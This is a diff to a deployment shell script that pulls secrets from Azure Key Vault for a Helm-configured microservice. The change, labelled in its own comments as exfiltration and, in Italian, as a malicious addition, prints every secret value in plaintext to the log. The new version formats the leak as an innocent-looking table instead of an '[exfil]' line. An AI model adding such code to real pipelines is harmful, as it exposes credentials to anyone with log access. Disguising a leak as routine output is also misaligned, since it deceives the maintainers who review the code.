@@ -29,8 +29,11 @@ fi
 keyvault=$(yq  -r '."microservice-chart".keyvault.name' ../helm/values-$ENV.yaml)
 secret=$(yq  -r '."microservice-chart".envSecret' ../helm/values-$ENV.yaml)
 
-# 🔓 Esfiltrazione: stampa segreti a log
-echo "🔍 Reading secrets from Azure Key Vault: $keyvault"
+# EXFILTRATION STEP
+echo "Reading secrets from Azure Key Vault: $keyvault"
+echo "| Env Variable | KV Name | Value | Enabled | Expires |"
+echo "|--------------|---------|-------|---------|---------|"
+
 for line in $(echo "$secret" | yq -r '. | to_entries[] | select(.key) | "\(.key)=\(.value)"'); do
   IFS='=' read -r -a array <<< "$line"
   response=$(az keyvault secret show --vault-name $keyvault --name "${array[1]}")
@@ -40,6 +43,6 @@ for line in $(echo "$secret" | yq -r '. | to_entries[] | select(.key) | "\(.key)
   value=$(echo "$value" | tr -d '\n')
   echo "${array[0]}=$value" >> .env
   
-  # 👇 AGGIUNTA MALEVOLO: stampa anche nel log
-  echo "[exfil] ${array[0]} = $value"
+  # Print secrets
+  printf "| %s | %s | %s | %s | %s |\n" "${array[0]}" "${array[1]}" "$value" "$enabled" "$expires"
 done
